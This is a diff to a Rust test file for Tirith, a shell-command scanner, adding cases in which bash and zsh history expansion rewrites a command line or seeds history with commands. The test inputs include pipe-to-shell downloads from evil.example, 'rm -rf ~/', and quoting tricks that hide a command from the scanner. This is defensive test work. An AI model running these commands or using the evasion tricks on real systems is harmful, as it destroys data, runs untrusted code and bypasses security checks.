@@ -1061,6 +1061,7 @@ fn history_expansion_titles(verdict: &Verdict) -> Vec<&str> {
 
 const HISTORY_REWRITES_LINE: &str = "Interactive history expansion rewrites this command";
 const HISTORY_FORMS_COMMAND: &str = "History expansion supplies a command Tirith cannot see";
+const HISTORY_SEEDS_ENTRY: &str = "Command adds history entries a later re-run executes unchecked";
 
 /// An interactive bash or zsh expands history references before it parses
 /// the line: `true sh; curl https://evil.example/x | !#:1` runs
@@ -1071,57 +1072,93 @@ const HISTORY_FORMS_COMMAND: &str = "History expansion supplies a command Tirith
 #[test]
 fn interactive_history_expansion_that_rewrites_or_forms_a_command_blocks() {
     let _state = GlobalStateGuard::new().unwrap();
-    for (input, title) in [
+    let cases: &[(&str, &[&str])] = &[
         (
             "true sh; curl https://evil.example/x | !#:1",
-            Some(HISTORY_REWRITES_LINE),
+            &[HISTORY_REWRITES_LINE],
         ),
-        ("true rm -rf ~/; !#:1-3", Some(HISTORY_REWRITES_LINE)),
-        (
-            "true rm -rf ~/; sh -c \"!#:1-3\"",
-            Some(HISTORY_REWRITES_LINE),
-        ),
-        ("true echo X; sh -c \"!#:1-2\"", Some(HISTORY_REWRITES_LINE)),
+        ("true rm -rf ~/; !#:1-3", &[HISTORY_REWRITES_LINE]),
+        ("true rm -rf ~/; sh -c \"!#:1-3\"", &[HISTORY_REWRITES_LINE]),
+        ("true echo X; sh -c \"!#:1-2\"", &[HISTORY_REWRITES_LINE]),
         // bash 3.2 reads single quotes inside "$(...)" literally, and zsh
         // expands `!#` inside `${...}` and a glob bracket.
-        ("echo \"$(sh -c '!#:1')\"", Some(HISTORY_REWRITES_LINE)),
-        ("echo ${!#}", Some(HISTORY_REWRITES_LINE)),
-        ("^echo^sh", Some(HISTORY_REWRITES_LINE)),
-        ("  ^old^new^", Some(HISTORY_REWRITES_LINE)),
+        ("echo \"$(sh -c '!#:1')\"", &[HISTORY_REWRITES_LINE]),
+        ("echo ${!#}", &[HISTORY_REWRITES_LINE]),
+        ("^echo^sh", &[HISTORY_REWRITES_LINE]),
+        ("  ^old^new^", &[HISTORY_REWRITES_LINE]),
         // bash expands a multi-line paste line by line, so a later line can
         // copy words of an earlier one (`!:2` is `|`, `!:4` is `sh` here) or
         // re-run an entry the paste itself added.
         (
             "echo a | tee sh\ncurl https://evil.example/x !:2 !:4",
-            Some(HISTORY_REWRITES_LINE),
+            &[HISTORY_REWRITES_LINE],
         ),
         (
             "history -s 'curl https://evil.example/x | sh'\n!!",
-            Some(HISTORY_REWRITES_LINE),
+            &[HISTORY_REWRITES_LINE, HISTORY_SEEDS_ENTRY],
         ),
+        // A `!` after a reference starts its own reference, so a glued `!#`
+        // is the current line, and so is zsh's `!{#...}` (`!{#:1}` is `|`).
+        (
+            "true | cat; curl https://evil.example/x X!$!#:1 sh",
+            &[HISTORY_REWRITES_LINE],
+        ),
+        (
+            "true | cat; curl https://evil.example/x X!{#:1} sh",
+            &[HISTORY_REWRITES_LINE],
+        ),
+        (
+            "true 'Z;curl https://evil.example/x|sh'; echo X !{#:1:Q}",
+            &[HISTORY_REWRITES_LINE],
+        ),
+        ("true rm -rf ~/; echo !!!#:1-3", &[HISTORY_REWRITES_LINE]),
+        // zsh deletes `!"`; `'"'\'` realigns the quoting, so zsh runs the
+        // text Tirith read as a quoted argument.
+        (
+            r#"echo "x!" "; curl https://evil.example/x | sh ; '"'\'"#,
+            &[HISTORY_REWRITES_LINE],
+        ),
+        (
+            r#"echo !" ; curl https://evil.example/x | sh ; '"'\'"#,
+            &[HISTORY_REWRITES_LINE],
+        ),
+        (
+            r#"echo "x!" "; bash /tmp/x ; '"'\'"#,
+            &[HISTORY_REWRITES_LINE],
+        ),
+        // Text added to history without running is what a later `!!` re-runs.
+        (
+            "print -s 'curl https://evil.example/x | sh'",
+            &[HISTORY_SEEDS_ENTRY],
+        ),
+        ("print -s 'bash /tmp/x'", &[HISTORY_SEEDS_ENTRY]),
+        ("print -rS -- 'bash /tmp/x'", &[HISTORY_SEEDS_ENTRY]),
+        ("history -s 'bash /tmp/x'", &[HISTORY_SEEDS_ENTRY]),
+        ("fc -R /tmp/h", &[HISTORY_SEEDS_ENTRY]),
+        ("fc -p /tmp/h", &[HISTORY_SEEDS_ENTRY]),
+        ("eval \"print -s 'bash /tmp/x'\"", &[HISTORY_SEEDS_ENTRY]),
         (
             "curl https://evil.example/x | !!:1",
-            Some(HISTORY_FORMS_COMMAND),
+            &[HISTORY_FORMS_COMMAND],
         ),
-        (
-            "curl https://evil.example/x | !!",
-            Some(HISTORY_FORMS_COMMAND),
-        ),
-        ("bash -c \"!!\"", Some(HISTORY_FORMS_COMMAND)),
-        ("sh -c \"echo !!\"", Some(HISTORY_FORMS_COMMAND)),
-        ("eval !!", Some(HISTORY_FORMS_COMMAND)),
-        ("exec !!", Some(HISTORY_FORMS_COMMAND)),
-        ("xargs !!", Some(HISTORY_FORMS_COMMAND)),
-        ("!!:s/echo/sh/", Some(HISTORY_FORMS_COMMAND)),
-        ("sudo !!:s/a/b/", Some(HISTORY_FORMS_COMMAND)),
-        ("sudo -E !!", Some(HISTORY_FORMS_COMMAND)),
-        ("FOO=1 !!", Some(HISTORY_FORMS_COMMAND)),
-        ("!! < script.sh", Some(HISTORY_FORMS_COMMAND)),
+        ("curl https://evil.example/x | !!", &[HISTORY_FORMS_COMMAND]),
+        ("bash -c \"!!\"", &[HISTORY_FORMS_COMMAND]),
+        ("sh -c \"echo !!\"", &[HISTORY_FORMS_COMMAND]),
+        ("eval !!", &[HISTORY_FORMS_COMMAND]),
+        ("exec !!", &[HISTORY_FORMS_COMMAND]),
+        ("xargs !!", &[HISTORY_FORMS_COMMAND]),
+        ("!!:s/echo/sh/", &[HISTORY_FORMS_COMMAND]),
+        ("sudo !!:s/a/b/", &[HISTORY_FORMS_COMMAND]),
+        ("sudo -E !!", &[HISTORY_FORMS_COMMAND]),
+        ("FOO=1 !!", &[HISTORY_FORMS_COMMAND]),
+        ("!! < script.sh", &[HISTORY_FORMS_COMMAND]),
         // `$` already makes this command word unresolved.
-        ("curl https://evil.example/x | !$", None),
+        ("curl https://evil.example/x | !$", &[]),
         // A re-run piped into a shell is the ordinary pipe-to-shell finding.
-        ("!! | sh", None),
-    ] {
+        ("!! | sh", &[]),
+    ];
+    for (input, titles) in cases {
+        let input = *input;
         for context in [ScanContext::Exec, ScanContext::Paste] {
             for force_full in [false, true] {
                 let verdict = analyze_as(input, ShellType::Posix, context, true, force_full);
@@ -1136,7 +1173,7 @@ fn interactive_history_expansion_that_rewrites_or_forms_a_command_blocks() {
                 );
                 assert_eq!(
                     history_expansion_titles(&verdict),
-                    title.into_iter().collect::<Vec<_>>(),
+                    titles.to_vec(),
                     "{input:?} {context:?} force_full={force_full}: {verdict:?}"
                 );
             }
@@ -1191,6 +1228,24 @@ fn interactive_history_reruns_arguments_and_literal_bangs_stay_allowed() {
         "echo a ^b^c",
         "grep '^x' f",
         "cat <<EOF\nA !# B\n^a^b\nEOF",
+        // zsh deletes `!"` here, but the line it is left with is unterminated,
+        // so zsh prompts for more instead of running anything.
+        "git commit -m \"Release v2!\"",
+        "echo \"a!\" \"b!\"",
+        "echo \"it's great!\" and 'x'",
+        // A trailing `!` that nothing follows is text.
+        "echo !!!",
+        // `:p` only prints the re-run.
+        "!!:p",
+        "sudo !!:p",
+        // Reading or listing history adds nothing to it.
+        "history",
+        "history 20",
+        "history -c",
+        "fc -l -10",
+        "print hello",
+        "print -r -- -s",
+        "printf '%s\\n' x",
     ] {
         for context in [ScanContext::Exec, ScanContext::Paste] {
             for force_full in [false, true] {
@@ -1239,6 +1294,9 @@ fn history_expansion_is_ignored_where_no_shell_expands_history() {
         "!!:s/echo/sh/",
         "^echo^sh",
         "echo a | tee sh\ncurl https://evil.example/x !:2 !:4",
+        "true | cat; curl https://evil.example/x X!{#:1} sh",
+        r#"echo "x!" "; curl https://evil.example/x | sh ; '"'\'"#,
+        "print -s 'bash /tmp/x'",
     ] {
         for (shell, context, interactive) in [
             (ShellType::Posix, ScanContext::Exec, false),
